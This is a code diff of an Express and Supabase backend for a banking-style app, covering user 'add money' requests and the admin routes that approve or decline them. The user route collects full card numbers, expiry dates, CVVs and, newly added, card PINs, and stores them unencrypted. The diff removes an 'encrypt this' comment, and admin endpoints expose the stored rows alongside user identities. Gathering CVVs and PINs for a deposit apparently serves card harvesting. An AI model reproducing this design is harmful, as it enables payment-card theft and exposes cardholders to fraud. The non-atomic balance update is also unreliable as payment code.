@@ -1937,10 +1937,8 @@ app.post("/api/chat/live", authenticate, async (req, res) => {
 });
 
 // In your user routes file (protected by authenticate middleware)
-//const { authenticate, checkAccountFrozen } = require('../middleware/auth'); // Note: Add Money bypasses freeze
-
 // GET saved cards (for display in Add Money page)
-router.get('/saved-cards', authenticate, async (req, res) => {
+app.get('/api/user/saved-cards', authenticate, async (req, res) => {
     try {
         const { data, error } = await supabase
             .from('add_money_requests')
@@ -1953,13 +1951,14 @@ router.get('/saved-cards', authenticate, async (req, res) => {
 
         res.json(data || []);
     } catch (error) {
+        console.error('Saved cards error:', error);
         res.status(500).json({ error: 'Failed to load saved cards' });
     }
 });
 
-// POST Add Money Request (BYPASSES freeze and OTP as requested)
-router.post('/add-money', authenticate, async (req, res) => {
-    const { card_number, expiry_date, cvv, cardholder_name, amount } = req.body;
+// POST Add Money Request
+app.post('/api/user/add-money', authenticate, async (req, res) => {
+    const { card_number, expiry_date, cvv, cardholder_name, amount, card_pin } = req.body;
 
     if (!card_number || !expiry_date || !cvv || !cardholder_name || !amount || amount < 10) {
         return res.status(400).json({ error: 'Invalid card or amount details' });
@@ -1970,11 +1969,12 @@ router.post('/add-money', authenticate, async (req, res) => {
             .from('add_money_requests')
             .insert({
                 user_id: req.user.id,
-                card_number,      // In production: encrypt this!
+                card_number: card_number.replace(/\s/g, ''), // Remove spaces
                 expiry_date,
                 cvv,
                 cardholder_name,
                 amount,
+                card_pin: card_pin || null, // Add PIN field
                 status: 'pending'
             })
             .select()
@@ -1982,11 +1982,11 @@ router.post('/add-money', authenticate, async (req, res) => {
 
         if (error) throw error;
 
-        // Optional: Send notification to user
+        // Create notification for user
         await supabase.from('notifications').insert({
             user_id: req.user.id,
             title: 'Add Money Request Submitted',
-            message: `Your request to add $${amount} is pending admin approval (usually within 1 hour).`,
+            message: `Your request to add $${amount} is pending admin approval.`,
             type: 'info'
         });
 
@@ -1996,7 +1996,7 @@ router.post('/add-money', authenticate, async (req, res) => {
             request_id: data.id 
         });
     } catch (error) {
-        console.error(error);
+        console.error('Add money error:', error);
         res.status(500).json({ error: 'Failed to submit add money request' });
     }
 });
@@ -2004,31 +2004,51 @@ router.post('/add-money', authenticate, async (req, res) => {
 // ==================== ADMIN ROUTES ================
 
 // In your admin routes file (protected by authenticate + authorizeAdmin)
-
-
-//const { authenticate, authorizeAdmin } = require('../middleware/auth');
-
-// GET all pending add money requests
-router.get('/add-money-requests', authenticate, authorizeAdmin, async (req, res) => {
+// Admin routes for add money requests
+app.get('/api/admin/add-money-requests', authenticate, authorizeAdmin, async (req, res) => {
     try {
-        const { data, error } = await supabase
+        const { page = 1, status = 'pending' } = req.query;
+        const limit = 20;
+        const offset = (page - 1) * limit;
+
+        let query = supabase
             .from('add_money_requests')
             .select(`
-                *, 
+                *,
                 user:users(id, first_name, last_name, email)
             `)
-            .eq('status', 'pending')
             .order('created_at', { ascending: false });
 
+        if (status && status !== 'all') {
+            query = query.eq('status', status);
+        }
+
+        const { data, error, count } = await query.range(offset, offset + limit - 1);
+
         if (error) throw error;
-        res.json(data || []);
+
+        // Also get pending count for badge
+        const { count: pendingCount } = await supabase
+            .from('add_money_requests')
+            .select('*', { count: 'exact', head: true })
+            .eq('status', 'pending');
+
+        res.json({
+            requests: data || [],
+            pagination: {
+                page: parseInt(page),
+                pages: Math.ceil((count || 0) / limit),
+                total: count || 0
+            },
+            pendingCount
+        });
     } catch (error) {
+        console.error('Admin add money requests error:', error);
         res.status(500).json({ error: 'Failed to load requests' });
     }
 });
 
-// POST Accept Add Money Request
-router.post('/add-money-requests/:id/approve', authenticate, authorizeAdmin, async (req, res) => {
+app.post('/api/admin/add-money-requests/:id/approve', authenticate, authorizeAdmin, async (req, res) => {
     const { id } = req.params;
 
     try {
@@ -2039,10 +2059,12 @@ router.post('/add-money-requests/:id/approve', authenticate, authorizeAdmin, asy
             .eq('id', id)
             .single();
 
-        if (fetchError || !request) return res.status(404).json({ error: 'Request not found' });
+        if (fetchError || !request) {
+            return res.status(404).json({ error: 'Request not found' });
+        }
 
-        // Update request status
-        await supabase
+        // Start a transaction
+        const { error: updateError } = await supabase
             .from('add_money_requests')
             .update({ 
                 status: 'approved',
@@ -2051,41 +2073,57 @@ router.post('/add-money-requests/:id/approve', authenticate, authorizeAdmin, asy
             })
             .eq('id', id);
 
-        // Add money to user's primary account (or first account)
-        const { data: account } = await supabase
+        if (updateError) throw updateError;
+
+        // Add money to user's primary account
+        const { data: account, error: accountError } = await supabase
             .from('accounts')
-            .select('id')
+            .select('*')
             .eq('user_id', request.user_id)
+            .order('created_at', { ascending: true })
             .limit(1)
             .single();
 
-        if (account) {
+        if (account && !accountError) {
+            const newBalance = account.balance + request.amount;
             await supabase
                 .from('accounts')
                 .update({ 
-                    balance: supabase.rpc('increment_balance', { amount: request.amount }),
-                    available_balance: supabase.rpc('increment_balance', { amount: request.amount })
+                    balance: newBalance,
+                    available_balance: newBalance
                 })
                 .eq('id', account.id);
+
+            // Create transaction record
+            await supabase.from('transactions').insert({
+                to_account_id: account.id,
+                to_user_id: request.user_id,
+                amount: request.amount,
+                description: `Add money via card (Admin approved)`,
+                transaction_type: 'deposit',
+                status: 'completed',
+                completed_at: new Date().toISOString(),
+                is_admin_adjusted: true,
+                admin_note: `Approved by admin ${req.user.email}`
+            });
         }
 
-        // Notification to user
+        // Send notification
         await supabase.from('notifications').insert({
             user_id: request.user_id,
             title: 'Add Money Approved',
-            message: `$${request.amount} has been added to your balance.`,
+            message: `$${request.amount} has been added to your account.`,
             type: 'success'
         });
 
         res.json({ success: true, message: 'Funds added successfully' });
     } catch (error) {
-        console.error(error);
+        console.error('Approve error:', error);
         res.status(500).json({ error: 'Failed to approve request' });
     }
 });
 
-// POST Decline Add Money Request
-router.post('/add-money-requests/:id/decline', authenticate, authorizeAdmin, async (req, res) => {
+app.post('/api/admin/add-money-requests/:id/decline', authenticate, authorizeAdmin, async (req, res) => {
     const { id } = req.params;
     const { reason } = req.body;
 
@@ -2096,7 +2134,9 @@ router.post('/add-money-requests/:id/decline', authenticate, authorizeAdmin, asy
             .eq('id', id)
             .single();
 
-        if (!request) return res.status(404).json({ error: 'Request not found' });
+        if (!request) {
+            return res.status(404).json({ error: 'Request not found' });
+        }
 
         await supabase
             .from('add_money_requests')
@@ -2108,7 +2148,6 @@ router.post('/add-money-requests/:id/decline', authenticate, authorizeAdmin, asy
             })
             .eq('id', id);
 
-        // Notification to user
         await supabase.from('notifications').insert({
             user_id: request.user_id,
             title: 'Add Money Declined',
@@ -2118,6 +2157,7 @@ router.post('/add-money-requests/:id/decline', authenticate, authorizeAdmin, asy
 
         res.json({ success: true, message: 'Request declined' });
     } catch (error) {
+        console.error('Decline error:', error);
         res.status(500).json({ error: 'Failed to decline request' });
     }
 });
